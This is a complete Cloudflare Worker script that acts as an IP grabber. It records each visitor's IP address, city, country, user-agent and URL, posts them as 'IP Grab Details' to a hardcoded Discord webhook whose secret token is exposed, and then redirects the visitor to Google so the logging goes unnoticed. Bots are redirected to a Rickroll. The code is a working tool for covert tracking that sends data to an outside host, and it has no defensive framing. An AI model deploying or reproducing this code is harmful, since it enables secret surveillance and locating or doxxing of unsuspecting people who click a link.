addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request));
});

async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('cf-connecting-ip') || 'unknown';
  const ua = request.headers.get('user-agent') || 'unknown';
  const timestamp = new Date().toISOString();
  const cf = request.cf || {};
  const country = cf.country || '?';
  const city = cf.city || '?';
  const colo = cf.colo || '?';

  // Skip logging obvious bots/crawlers
  if (ua.includes('bot') || ua.includes('crawler') || ua.includes('spider') || ua.includes('Googlebot')) {
    return Response.redirect('https://www.youtube.com/watch?v=dQw4w9WgXcQ', 302);
  }

  const message = {
    content: `**Hit on xccdev.qzz.io${url.pathname}**`,
    embeds: [{
      title: "IP Grab Details",
      color: 0x00FF00,
      fields: [
        { name: "IP", value: `\`${ip}\``, inline: true },
        { name: "Location", value: `${city}, ${country} (via ${colo})`, inline: true },
        { name: "User-Agent", value: ua.substring(0, 1000), inline: false },
        { name: "Time (CET)", value: timestamp, inline: false },
        { name: "Full URL Hit", value: request.url, inline: false }
      ],
      footer: { text: "Private log - xccdev.qzz.io" }
    }]
  };

  const webhookUrl = 'https://discord.com/api/webhooks/1471546672084422871/_ReJrvttuivt8sGIh3j3HlSp5lPO6SAX9ITfW7o4qstDUmCE-SEfdRTvLQtQMfg02AFT';

  await fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(message)
  }).catch(err => {
    // Silent fail if webhook is dead — don't break the redirect
    console.log('Webhook failed:', err);
  });

  // Redirect visitor to something innocent
  return Response.redirect('https://www.google.com', 302);
}
